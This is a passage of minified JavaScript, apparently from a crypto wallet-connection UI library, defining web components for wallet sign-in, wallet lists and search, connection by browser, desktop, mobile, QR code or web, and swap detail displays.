    </wui-link>`}onCopyUri(){try{this.uri&&(ke.copyToClopboard(this.uri),vt.showSuccess("Link copied"))}catch{vt.showError("Failed to copy")}}};yg.styles=RBe;O4([te()],yg.prototype,"socialProvider",void 0);O4([te()],yg.prototype,"uri",void 0);O4([te()],yg.prototype,"ready",void 0);O4([te()],yg.prototype,"loading",void 0);yg=O4([me("w3m-connecting-farcaster-view")],yg);var eO=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let $7=class extends he{constructor(){super(...arguments),this.dappName=Ne.state.metadata?.name,this.isCancelling=!1,this.isSigning=!1}render(){return F`
      <wui-flex justifyContent="center" .padding=${["2xl","0","xxl","0"]}>
        <w3m-siwx-sign-message-thumbnails></w3m-siwx-sign-message-thumbnails>
      </wui-flex>
      <wui-flex
        .padding=${["0","4xl","l","4xl"]}
        gap="s"
        justifyContent="space-between"
      >
        <wui-text variant="paragraph-500" align="center" color="fg-100"
          >${this.dappName??"Dapp"} needs to connect to your wallet</wui-text
        >
      </wui-flex>
      <wui-flex
        .padding=${["0","3xl","l","3xl"]}
        gap="s"
        justifyContent="space-between"
      >
        <wui-text variant="small-400" align="center" color="fg-200"
          >Sign this message to prove you own this wallet and proceed. Canceling will disconnect
          you.</wui-text
        >
      </wui-flex>
      <wui-flex .padding=${["l","xl","xl","xl"]} gap="s" justifyContent="space-between">
        <wui-button
          size="lg"
          borderRadius="xs"
          fullWidth
          variant="neutral"
          ?loading=${this.isCancelling}
          @click=${this.onCancel.bind(this)}
          data-testid="w3m-connecting-siwe-cancel"
        >
          ${this.isCancelling?"Cancelling...":"Cancel"}
        </wui-button>
        <wui-button
          size="lg"
          borderRadius="xs"
          fullWidth
          variant="main"
          @click=${this.onSign.bind(this)}
          ?loading=${this.isSigning}
          data-testid="w3m-connecting-siwe-sign"
        >
          ${this.isSigning?"Signing...":"Sign"}
        </wui-button>
      </wui-flex>
    `}async onSign(){this.isSigning=!0,await xd.requestSignMessage().finally(()=>this.isSigning=!1)}async onCancel(){this.isCancelling=!0,await xd.cancelSignMessage().finally(()=>this.isCancelling=!1)}};eO([te()],$7.prototype,"isCancelling",void 0);eO([te()],$7.prototype,"isSigning",void 0);$7=eO([me("w3m-siwx-sign-message-view")],$7);const OBe=ge`
  wui-grid {
    max-height: clamp(360px, 400px, 80vh);
    overflow: scroll;
    scrollbar-width: none;
    grid-auto-rows: min-content;
    grid-template-columns: repeat(auto-fill, 104px);
  }

  @media (max-width: 350px) {
    wui-grid {
      grid-template-columns: repeat(2, 1fr);
    }
  }

  wui-grid[data-scroll='false'] {
    overflow: hidden;
  }

  wui-grid::-webkit-scrollbar {
    display: none;
  }

  wui-loading-spinner {
    padding-top: var(--wui-spacing-l);
    padding-bottom: var(--wui-spacing-l);
    justify-content: center;
    grid-column: 1 / span 4;
  }
`;var B4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const tz="local-paginator";let xg=class extends he{constructor(){super(),this.unsubscribe=[],this.paginationObserver=void 0,this.loading=!Ft.state.wallets.length,this.wallets=Ft.state.wallets,this.recommended=Ft.state.recommended,this.featured=Ft.state.featured,this.unsubscribe.push(Ft.subscribeKey("wallets",e=>this.wallets=e),Ft.subscribeKey("recommended",e=>this.recommended=e),Ft.subscribeKey("featured",e=>this.featured=e))}firstUpdated(){this.initialFetch(),this.createPaginationObserver()}disconnectedCallback(){this.unsubscribe.forEach(e=>e()),this.paginationObserver?.disconnect()}render(){return F`
      <wui-grid
        data-scroll=${!this.loading}
        .padding=${["0","s","s","s"]}
        columnGap="xxs"
        rowGap="l"
        justifyContent="space-between"
      >
        ${this.loading?this.shimmerTemplate(16):this.walletsTemplate()}
        ${this.paginationLoaderTemplate()}
      </wui-grid>
    `}async initialFetch(){this.loading=!0;const e=this.shadowRoot?.querySelector("wui-grid");e&&(await Ft.fetchWallets({page:1}),await e.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.loading=!1,e.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"}))}shimmerTemplate(e,t){return[...Array(e)].map(()=>F`
        <wui-card-select-loader type="wallet" id=${ye(t)}></wui-card-select-loader>
      `)}walletsTemplate(){const e=[...this.featured,...this.recommended,...this.wallets];return d0.markWalletsAsInstalled(e).map(i=>F`
        <w3m-all-wallets-list-item
          @click=${()=>this.onConnectWallet(i)}
          .wallet=${i}
        ></w3m-all-wallets-list-item>
      `)}paginationLoaderTemplate(){const{wallets:e,recommended:t,featured:i,count:n}=Ft.state,s=window.innerWidth<352?3:4,o=e.length+t.length;let c=Math.ceil(o/s)*s-o+s;return c-=e.length?i.length%s:0,n===0&&i.length>0?null:n===0||[...i,...e,...t].length<n?this.shimmerTemplate(c,tz):null}createPaginationObserver(){const e=this.shadowRoot?.querySelector(`#${tz}`);e&&(this.paginationObserver=new IntersectionObserver(([t])=>{if(t?.isIntersecting&&!this.loading){const{page:i,count:n,wallets:s}=Ft.state;s.length<n&&Ft.fetchWallets({page:i+1})}}),this.paginationObserver.observe(e))}onConnectWallet(e){Xe.selectWalletConnector(e)}};xg.styles=OBe;B4([te()],xg.prototype,"loading",void 0);B4([te()],xg.prototype,"wallets",void 0);B4([te()],xg.prototype,"recommended",void 0);B4([te()],xg.prototype,"featured",void 0);xg=B4([me("w3m-all-wallets-list")],xg);const BBe=ge`
  button {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    cursor: pointer;
    width: 104px;
    row-gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-s) var(--wui-spacing-0);
    background-color: var(--wui-color-gray-glass-002);
    border-radius: clamp(0px, var(--wui-border-radius-xs), 20px);
    transition:
      color var(--wui-duration-lg) var(--wui-ease-out-power-1),
      background-color var(--wui-duration-lg) var(--wui-ease-out-power-1),
      border-radius var(--wui-duration-lg) var(--wui-ease-out-power-1);
    will-change: background-color, color, border-radius;
    outline: none;
    border: none;
  }

  button > wui-flex > wui-text {
    color: var(--wui-color-fg-100);
    max-width: 86px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    justify-content: center;
  }

  button > wui-flex > wui-text.certified {
    max-width: 66px;
  }

  button:hover:enabled {
    background-color: var(--wui-color-gray-glass-005);
  }

  button:disabled > wui-flex > wui-text {
    color: var(--wui-color-gray-glass-015);
  }

  [data-selected='true'] {
    background-color: var(--wui-color-accent-glass-020);
  }

  @media (hover: hover) and (pointer: fine) {
    [data-selected='true']:hover:enabled {
      background-color: var(--wui-color-accent-glass-015);
    }
  }

  [data-selected='true']:active:enabled {
    background-color: var(--wui-color-accent-glass-010);
  }

  @media (max-width: 350px) {
    button {
      width: 100%;
    }
  }
`;var M4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Cg=class extends he{constructor(){super(),this.observer=new IntersectionObserver(()=>{}),this.visible=!1,this.imageSrc=void 0,this.imageLoading=!1,this.wallet=void 0,this.observer=new IntersectionObserver(e=>{e.forEach(t=>{t.isIntersecting?(this.visible=!0,this.fetchImageSrc()):this.visible=!1})},{threshold:.01})}firstUpdated(){this.observer.observe(this)}disconnectedCallback(){this.observer.disconnect()}render(){const e=this.wallet?.badge_type==="certified";return F`
      <button>
        ${this.imageTemplate()}
        <wui-flex flexDirection="row" alignItems="center" justifyContent="center" gap="3xs">
          <wui-text
            variant="tiny-500"
            color="inherit"
            class=${ye(e?"certified":void 0)}
            >${this.wallet?.name}</wui-text
          >
          ${e?F`<wui-icon size="sm" name="walletConnectBrown"></wui-icon>`:null}
        </wui-flex>
      </button>
    `}imageTemplate(){return!this.visible&&!this.imageSrc||this.imageLoading?this.shimmerTemplate():F`
      <wui-wallet-image
        size="md"
        imageSrc=${ye(this.imageSrc)}
        name=${this.wallet?.name}
        .installed=${this.wallet?.installed}
        badgeSize="sm"
      >
      </wui-wallet-image>
    `}shimmerTemplate(){return F`<wui-shimmer width="56px" height="56px" borderRadius="xs"></wui-shimmer>`}async fetchImageSrc(){this.wallet&&(this.imageSrc=Nr.getWalletImage(this.wallet),!this.imageSrc&&(this.imageLoading=!0,this.imageSrc=await Nr.fetchWalletImage(this.wallet.image_id),this.imageLoading=!1))}};Cg.styles=BBe;M4([te()],Cg.prototype,"visible",void 0);M4([te()],Cg.prototype,"imageSrc",void 0);M4([te()],Cg.prototype,"imageLoading",void 0);M4([V()],Cg.prototype,"wallet",void 0);Cg=M4([me("w3m-all-wallets-list-item")],Cg);const MBe=ge`
  wui-grid,
  wui-loading-spinner,
  wui-flex {
    height: 360px;
  }

  wui-grid {
    overflow: scroll;
    scrollbar-width: none;
    grid-auto-rows: min-content;
    grid-template-columns: repeat(auto-fill, 104px);
  }

  wui-grid[data-scroll='false'] {
    overflow: hidden;
  }

  wui-grid::-webkit-scrollbar {
    display: none;
  }

  wui-loading-spinner {
    justify-content: center;
    align-items: center;
  }

  @media (max-width: 350px) {
    wui-grid {
      grid-template-columns: repeat(2, 1fr);
    }
  }
`;var BC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Vw=class extends he{constructor(){super(...arguments),this.prevQuery="",this.prevBadge=void 0,this.loading=!0,this.query=""}render(){return this.onSearch(),this.loading?F`<wui-loading-spinner color="accent-100"></wui-loading-spinner>`:this.walletsTemplate()}async onSearch(){(this.query.trim()!==this.prevQuery.trim()||this.badge!==this.prevBadge)&&(this.prevQuery=this.query,this.prevBadge=this.badge,this.loading=!0,await Ft.searchWallet({search:this.query,badge:this.badge}),this.loading=!1)}walletsTemplate(){const{search:e}=Ft.state,t=d0.markWalletsAsInstalled(e);return e.length?F`
      <wui-grid
        data-testid="wallet-list"
        .padding=${["0","s","s","s"]}
        rowGap="l"
        columnGap="xs"
        justifyContent="space-between"
      >
        ${t.map(i=>F`
            <w3m-all-wallets-list-item
              @click=${()=>this.onConnectWallet(i)}
              .wallet=${i}
              data-testid="wallet-search-item-${i.id}"
            ></w3m-all-wallets-list-item>
          `)}
      </wui-grid>
    `:F`
        <wui-flex
          data-testid="no-wallet-found"
          justifyContent="center"
          alignItems="center"
          gap="s"
          flexDirection="column"
        >
          <wui-icon-box
            size="lg"
            iconColor="fg-200"
            backgroundColor="fg-300"
            icon="wallet"
            background="transparent"
          ></wui-icon-box>
          <wui-text data-testid="no-wallet-found-text" color="fg-200" variant="paragraph-500">
            No Wallet found
          </wui-text>
        </wui-flex>
      `}onConnectWallet(e){Xe.selectWalletConnector(e)}};Vw.styles=MBe;BC([te()],Vw.prototype,"loading",void 0);BC([V()],Vw.prototype,"query",void 0);BC([V()],Vw.prototype,"badge",void 0);Vw=BC([me("w3m-all-wallets-search")],Vw);var MC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let fy=class extends he{constructor(){super(),this.platformTabs=[],this.unsubscribe=[],this.platforms=[],this.onSelectPlatfrom=void 0,this.buffering=!1,this.unsubscribe.push(ft.subscribeKey("buffering",e=>this.buffering=e))}disconnectCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.generateTabs();return F`
      <wui-flex justifyContent="center" .padding=${["0","0","l","0"]}>
        <wui-tabs
          ?disabled=${this.buffering}
          .tabs=${e}
          .onTabChange=${this.onTabChange.bind(this)}
        ></wui-tabs>
      </wui-flex>
    `}generateTabs(){const e=this.platforms.map(t=>t==="browser"?{label:"Browser",icon:"extension",platform:"browser"}:t==="mobile"?{label:"Mobile",icon:"mobile",platform:"mobile"}:t==="qrcode"?{label:"Mobile",icon:"mobile",platform:"qrcode"}:t==="web"?{label:"Webapp",icon:"browser",platform:"web"}:t==="desktop"?{label:"Desktop",icon:"desktop",platform:"desktop"}:{label:"Browser",icon:"extension",platform:"unsupported"});return this.platformTabs=e.map(({platform:t})=>t),e}onTabChange(e){const t=this.platformTabs[e];t&&this.onSelectPlatfrom?.(t)}};MC([V({type:Array})],fy.prototype,"platforms",void 0);MC([V()],fy.prototype,"onSelectPlatfrom",void 0);MC([te()],fy.prototype,"buffering",void 0);fy=MC([me("w3m-connecting-header")],fy);var DBe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let rz=class extends go{constructor(){if(super(),!this.wallet)throw new Error("w3m-connecting-wc-browser: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.onAutoConnect=this.onConnectProxy.bind(this),Ve.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"browser"}})}async onConnectProxy(){try{this.error=!1;const{connectors:e}=Xe.state,t=e.find(i=>i.type==="ANNOUNCED"&&i.info?.rdns===this.wallet?.rdns||i.type==="INJECTED"||i.name===this.wallet?.name);if(t)await ft.connectExternal(t,t.chain);else throw new Error("w3m-connecting-wc-browser: No connector found");Ut.close(),Ve.sendEvent({type:"track",event:"CONNECT_SUCCESS",properties:{method:"browser",name:this.wallet?.name||"Unknown"}})}catch(e){Ve.sendEvent({type:"track",event:"CONNECT_ERROR",properties:{message:e?.message??"Unknown"}}),this.error=!0}}};rz=DBe([me("w3m-connecting-wc-browser")],rz);var LBe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let iz=class extends go{constructor(){if(super(),!this.wallet)throw new Error("w3m-connecting-wc-desktop: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.onRender=this.onRenderProxy.bind(this),Ve.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"desktop"}})}onRenderProxy(){!this.ready&&this.uri&&(this.ready=!0,this.onConnect?.())}onConnectProxy(){if(this.wallet?.desktop_link&&this.uri)try{this.error=!1;const{desktop_link:e,name:t}=this.wallet,{redirect:i,href:n}=ke.formatNativeUrl(e,this.uri);ft.setWcLinking({name:t,href:n}),ft.setRecentWallet(this.wallet),ke.openHref(i,"_blank")}catch{this.error=!0}}};iz=LBe([me("w3m-connecting-wc-desktop")],iz);var UBe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let nz=class extends go{constructor(){if(super(),this.btnLabelTimeout=void 0,this.labelTimeout=void 0,this.onRender=()=>{!this.ready&&this.uri&&(this.ready=!0,this.onConnect?.())},this.onConnect=()=>{if(this.wallet?.mobile_link&&this.uri)try{this.error=!1;const{mobile_link:e,name:t}=this.wallet,{redirect:i,href:n}=ke.formatNativeUrl(e,this.uri);ft.setWcLinking({name:t,href:n}),ft.setRecentWallet(this.wallet);const s=ke.isIframe()?"_top":"_self";ke.openHref(i,s),clearTimeout(this.labelTimeout),this.secondaryLabel=kr.CONNECT_LABELS.MOBILE}catch(e){Ve.sendEvent({type:"track",event:"CONNECT_PROXY_ERROR",properties:{message:e instanceof Error?e.message:"Error parsing the deeplink",uri:this.uri,mobile_link:this.wallet.mobile_link,name:this.wallet.name}}),this.error=!0}},!this.wallet)throw new Error("w3m-connecting-wc-mobile: No wallet provided");this.secondaryBtnLabel=void 0,this.secondaryLabel=kr.CONNECT_LABELS.MOBILE,document.addEventListener("visibilitychange",this.onBuffering.bind(this)),Ve.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"mobile"}}),this.btnLabelTimeout=setTimeout(()=>{this.secondaryBtnLabel="Try again",this.secondaryLabel=kr.CONNECT_LABELS.MOBILE},kr.FIVE_SEC_MS),this.labelTimeout=setTimeout(()=>{this.secondaryLabel="Hold tight... it's taking longer than expected"},kr.THREE_SEC_MS)}disconnectedCallback(){super.disconnectedCallback(),document.removeEventListener("visibilitychange",this.onBuffering.bind(this)),clearTimeout(this.btnLabelTimeout),clearTimeout(this.labelTimeout)}onBuffering(){const e=ke.isIos();document?.visibilityState==="visible"&&!this.error&&e&&(ft.setBuffering(!0),setTimeout(()=>{ft.setBuffering(!1)},5e3))}onTryAgain(){this.buffering||(ft.setWcError(!1),this.onConnect())}};nz=UBe([me("w3m-connecting-wc-mobile")],nz);const jBe=ge`
  @keyframes fadein {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  wui-shimmer {
    width: 100%;
    aspect-ratio: 1 / 1;
    border-radius: clamp(0px, var(--wui-border-radius-l), 40px) !important;
  }

  wui-qr-code {
    opacity: 0;
    animation-duration: 200ms;
    animation-timing-function: ease;
    animation-name: fadein;
    animation-fill-mode: forwards;
  }
`;var FBe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Kk=class extends go{constructor(){super(),this.forceUpdate=()=>{this.requestUpdate()},window.addEventListener("resize",this.forceUpdate),Ve.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet?.name??"WalletConnect",platform:"qrcode"}})}disconnectedCallback(){super.disconnectedCallback(),this.unsubscribe?.forEach(e=>e()),window.removeEventListener("resize",this.forceUpdate)}render(){return this.onRenderProxy(),F`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["0","xl","xl","xl"]}
        gap="xl"
      >
        <wui-shimmer borderRadius="l" width="100%"> ${this.qrCodeTemplate()} </wui-shimmer>

        <wui-text variant="paragraph-500" color="fg-100">
          Scan this QR Code with your phone
        </wui-text>
        ${this.copyTemplate()}
      </wui-flex>
      <w3m-mobile-download-links .wallet=${this.wallet}></w3m-mobile-download-links>
    `}onRenderProxy(){!this.ready&&this.uri&&(this.timeout=setTimeout(()=>{this.ready=!0},200))}qrCodeTemplate(){if(!this.uri||!this.ready)return null;const e=this.getBoundingClientRect().width-40,t=this.wallet?this.wallet.name:void 0;return ft.setWcLinking(void 0),ft.setRecentWallet(this.wallet),F` <wui-qr-code
      size=${e}
      theme=${Mi.state.themeMode}
      uri=${this.uri}
      imageSrc=${ye(Nr.getWalletImage(this.wallet))}
      color=${ye(Mi.state.themeVariables["--w3m-qr-color"])}
      alt=${ye(t)}
      data-testid="wui-qr-code"
    ></wui-qr-code>`}copyTemplate(){const e=!this.uri||!this.ready;return F`<wui-link
      .disabled=${e}
      @click=${this.onCopyUri}
      color="fg-200"
      data-testid="copy-wc2-uri"
    >
      <wui-icon size="xs" color="fg-200" slot="iconLeft" name="copy"></wui-icon>
      Copy link
    </wui-link>`}};Kk.styles=jBe;Kk=FBe([me("w3m-connecting-wc-qrcode")],Kk);var qBe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let sz=class extends he{constructor(){if(super(),this.wallet=Ee.state.data?.wallet,!this.wallet)throw new Error("w3m-connecting-wc-unsupported: No wallet provided");Ve.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"browser"}})}render(){return F`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["3xl","xl","xl","xl"]}
        gap="xl"
      >
        <wui-wallet-image
          size="lg"
          imageSrc=${ye(Nr.getWalletImage(this.wallet))}
        ></wui-wallet-image>

        <wui-text variant="paragraph-500" color="fg-100">Not Detected</wui-text>
      </wui-flex>

      <w3m-mobile-download-links .wallet=${this.wallet}></w3m-mobile-download-links>
    `}};sz=qBe([me("w3m-connecting-wc-unsupported")],sz);var zBe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let oz=class extends go{constructor(){if(super(),!this.wallet)throw new Error("w3m-connecting-wc-web: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.secondaryBtnLabel="Open",this.secondaryLabel="Open and continue in a new browser tab",this.secondaryBtnIcon="externalLink",Ve.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"web"}})}onConnectProxy(){if(this.wallet?.webapp_link&&this.uri)try{this.error=!1;const{webapp_link:e,name:t}=this.wallet,{redirect:i,href:n}=ke.formatUniversalUrl(e,this.uri);ft.setWcLinking({name:t,href:n}),ft.setRecentWallet(this.wallet),ke.openHref(i,"_blank")}catch{this.error=!0}}};oz=zBe([me("w3m-connecting-wc-web")],oz);const WBe=ge`
  :host {
    width: 100%;
  }

  .details-container > wui-flex {
    background: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xxs);
    width: 100%;
  }

  .details-container > wui-flex > button {
    border: none;
    background: none;
    padding: var(--wui-spacing-s);
    border-radius: var(--wui-border-radius-xxs);
    cursor: pointer;
  }

  .details-content-container {
    padding: var(--wui-spacing-1xs);
    padding-top: 0px;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .details-content-container > wui-flex {
    width: 100%;
  }

  .details-row {
    width: 100%;
    padding: var(--wui-spacing-s);
    padding-left: var(--wui-spacing-s);
    padding-right: var(--wui-spacing-1xs);
    border-radius: calc(var(--wui-border-radius-5xs) + var(--wui-border-radius-4xs));
    background: var(--wui-color-gray-glass-002);
  }

  .details-row-title {
    white-space: nowrap;
  }

  .details-row.provider-free-row {
    padding-right: var(--wui-spacing-xs);
  }
`;var Tc=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const HBe=kr.CONVERT_SLIPPAGE_TOLERANCE;let Xo=class extends he{constructor(){super(),this.unsubscribe=[],this.networkName=re.state.activeCaipNetwork?.name,this.detailsOpen=!1,this.sourceToken=dt.state.sourceToken,this.toToken=dt.state.toToken,this.toTokenAmount=dt.state.toTokenAmount,this.sourceTokenPriceInUSD=dt.state.sourceTokenPriceInUSD,this.toTokenPriceInUSD=dt.state.toTokenPriceInUSD,this.gasPriceInUSD=dt.state.gasPriceInUSD,this.priceImpact=dt.state.priceImpact,this.maxSlippage=dt.state.maxSlippage,this.networkTokenSymbol=dt.state.networkTokenSymbol,this.inputError=dt.state.inputError,this.unsubscribe.push(dt.subscribe(e=>{this.sourceToken=e.sourceToken,this.toToken=e.toToken,this.toTokenAmount=e.toTokenAmount,this.gasPriceInUSD=e.gasPriceInUSD,this.priceImpact=e.priceImpact,this.maxSlippage=e.maxSlippage,this.sourceTokenPriceInUSD=e.sourceTokenPriceInUSD,this.toTokenPriceInUSD=e.toTokenPriceInUSD,this.inputError=e.inputError}))}render(){const e=this.toTokenAmount&&this.maxSlippage?Tr.bigNumber(this.toTokenAmount).minus(this.maxSlippage).toString():null;if(!this.sourceToken||!this.toToken||this.inputError)return null;const t=this.sourceTokenPriceInUSD&&this.toTokenPriceInUSD?1/this.toTokenPriceInUSD*this.sourceTokenPriceInUSD:0;return F`
      <wui-flex flexDirection="column" alignItems="center" gap="1xs" class="details-container">
        <wui-flex flexDirection="column">
          <button @click=${this.toggleDetails.bind(this)}>
            <wui-flex justifyContent="space-between" .padding=${["0","xs","0","xs"]}>
              <wui-flex justifyContent="flex-start" flexGrow="1" gap="xs">
                <wui-text variant="small-400" color="fg-100">
                  1 ${this.sourceToken.symbol} =
                  ${Wt.formatNumberToLocalString(t,3)}
                  ${this.toToken.symbol}
                </wui-text>
                <wui-text variant="small-400" color="fg-200">
                  $${Wt.formatNumberToLocalString(this.sourceTokenPriceInUSD)}
                </wui-text>
              </wui-flex>
              <wui-icon name="chevronBottom"></wui-icon>
            </wui-flex>
          </button>
          ${this.detailsOpen?F`
                <wui-flex flexDirection="column" gap="xs" class="details-content-container">
                  <wui-flex flexDirection="column" gap="xs">
                    <wui-flex
                      justifyContent="space-between"
                      alignItems="center"
                      class="details-row"
                    >
                      <wui-flex alignItems="center" gap="xs">
                        <wui-text class="details-row-title" variant="small-400" color="fg-150">
                          Network cost
                        </wui-text>
                        <w3m-tooltip-trigger
                          text=${`Network cost is paid in ${this.networkTokenSymbol} on the ${this.networkName} network in order to execute transaction.`}
                        >
                          <wui-icon size="xs" color="fg-250" name="infoCircle"></wui-icon>
                        </w3m-tooltip-trigger>
                      </wui-flex>
                      <wui-text variant="small-400" color="fg-100">
                        $${Wt.formatNumberToLocalString(this.gasPriceInUSD,3)}
                      </wui-text>
                    </wui-flex>
                  </wui-flex>
                  ${this.priceImpact?F` <wui-flex flexDirection="column" gap="xs">
                        <wui-flex
                          justifyContent="space-between"
                          alignItems="center"
                          class="details-row"
                        >
                          <wui-flex alignItems="center" gap="xs">
                            <wui-text class="details-row-title" variant="small-400" color="fg-150">
                              Price impact
                            </wui-text>
                            <w3m-tooltip-trigger
                              text="Price impact reflects the change in market price due to your trade"
                            >
                              <wui-icon size="xs" color="fg-250" name="infoCircle"></wui-icon>
                            </w3m-tooltip-trigger>
                          </wui-flex>
                          <wui-flex>
                            <wui-text variant="small-400" color="fg-200">
                              ${Wt.formatNumberToLocalString(this.priceImpact,3)}%
                            </wui-text>
                          </wui-flex>
                        </wui-flex>
                      </wui-flex>`:null}
                  ${this.maxSlippage&&this.sourceToken.symbol?F`<wui-flex flexDirection="column" gap="xs">
                        <wui-flex
                          justifyContent="space-between"
                          alignItems="center"
                          class="details-row"
                        >
                          <wui-flex alignItems="center" gap="xs">
                            <wui-text class="details-row-title" variant="small-400" color="fg-150">
                              Max. slippage
                            </wui-text>
                            <w3m-tooltip-trigger
                              text=${`Max slippage sets the minimum amount you must receive for the transaction to proceed. ${e?`Transaction will be reversed if you receive less than ${Wt.formatNumberToLocalString(e,6)} ${this.toToken.symbol} due to price changes.`:""}`}
                            >
                              <wui-icon size="xs" color="fg-250" name="infoCircle"></wui-icon>
                            </w3m-tooltip-trigger>
                          </wui-flex>
                          <wui-flex>
                            <wui-text variant="small-400" color="fg-200">
                              ${Wt.formatNumberToLocalString(this.maxSlippage,6)}
                              ${this.toToken.symbol} ${HBe}%
                            </wui-text>
                          </wui-flex>
                        </wui-flex>
                      </wui-flex>`:null}
                  <wui-flex flexDirection="column" gap="xs">
                    <wui-flex
                      justifyContent="space-between"
                      alignItems="center"
                      class="details-row provider-free-row"
                    >
                      <wui-flex alignItems="center" gap="xs">
                        <wui-text class="details-row-title" variant="small-400" color="fg-150">
                          Provider fee
                        </wui-text>
                      </wui-flex>
                      <wui-flex>
                        <wui-text variant="small-400" color="fg-200">0.85%</wui-text>
                      </wui-flex>
                    </wui-flex>
                  </wui-flex>
                </wui-flex>
              `:null}
        </wui-flex>
      </wui-flex>
